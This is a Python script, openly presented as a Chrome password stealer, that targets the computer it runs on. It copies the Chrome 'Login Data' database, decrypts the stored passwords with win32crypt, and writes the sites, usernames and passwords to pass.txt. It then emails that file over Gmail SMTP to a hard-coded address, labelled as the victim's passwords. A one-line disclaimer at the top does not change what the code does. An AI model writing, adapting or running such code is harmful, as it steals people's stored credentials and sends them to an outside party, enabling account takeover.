# Disclaimer: Do Not Use this program for illegal purposes !!

#Download and Install Pywin32 from http://sourceforge.net/projects/pywin32/files/pywin32/ to use this script.

import os
import sqlite3
import win32crypt
import sys
import shutil
import smtplib
import urllib2
import getpass #for username
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders

#Get username of victim

victimname = getpass.getuser()

#Check & make  Intel Directory 
if not os.path.exists("C:\Intel"):
    os.makedirs("C:\Intel")
	
#Copy Login Data to Intel Directory To bypass database is locked error!!
src = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
dst = "C:\Intel"
shutil.copy(src, dst)


#Database connect and query
login_database = os.path.join(dst, 'Login Data')
c = sqlite3.connect(login_database)
cursor = c.cursor()
select_statement = "SELECT origin_url, username_value, password_value FROM logins"
cursor.execute(select_statement)

login_data = cursor.fetchall()
credential = {}

#Decrytping the passwords
for url, user_name, pwd, in login_data:
	pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0) 
	credential[url] = (user_name, pwd[1])

#writing to a pass.txt file 
	with open('pass.txt', 'w') as f:
		f.write("Chrome Password Extractor Coded By SpeedCuber\n------------------------------------------\n")
		for url, credentials in credential.iteritems():
			if credentials[1]:
				f.write("\nSite = "+url+"\nUser = "+credentials[0].encode('utf-8')+ " \nPass = "+credentials[1]+"\n")
			else:
				f.write("\nWebsite = "+url+"\n"+"USER & PASS NOT FOUND!! \n")
print "[.] Successfully written to pass.txt!"

#Check internet connection
def internet_on():
    for timeout in [1,5,10,15]:
        try:
            response=urllib2.urlopen('http://google.com',timeout=timeout)
            return True
        except urllib2.URLError as err: pass
    return False



#Mail pass.txt 
gmail_user = "speedcuber@gmail.com" #Your Gmail username 
gmail_pwd = "lamepassword"          #Your Gmail password

def mail(to, subject, text, attach):
   msg = MIMEMultipart()

   msg['From'] = gmail_user
   msg['To'] = to
   msg['Subject'] = subject

   msg.attach(MIMEText(text))

   part = MIMEBase('application', 'octet-stream')
   part.set_payload(open(attach, 'rb').read())
   Encoders.encode_base64(part)
   part.add_header('Content-Disposition',
           'attachment; filename="%s"' % os.path.basename(attach))
   msg.attach(part)

   mailServer = smtplib.SMTP("smtp.gmail.com", 587)
   mailServer.ehlo()
   mailServer.starttls()
   mailServer.ehlo()
   mailServer.login(gmail_user, gmail_pwd)
   mailServer.sendmail(gmail_user, to, msg.as_string())
   # Should be mailServer.quit(), but that crashes...
   mailServer.close()

if internet_on():
	mail("speedcuber@gmail.com",
   "Chrome Pass Report of  "+victimname,
   "Attached is your victim Chrome Passwords",
   "pass.txt") #Your Gmail username
  print "[.] Successfully Sent Mail!!"
else:
	print "INTERNET IS NOT WORKING!!!"

sys.exit()
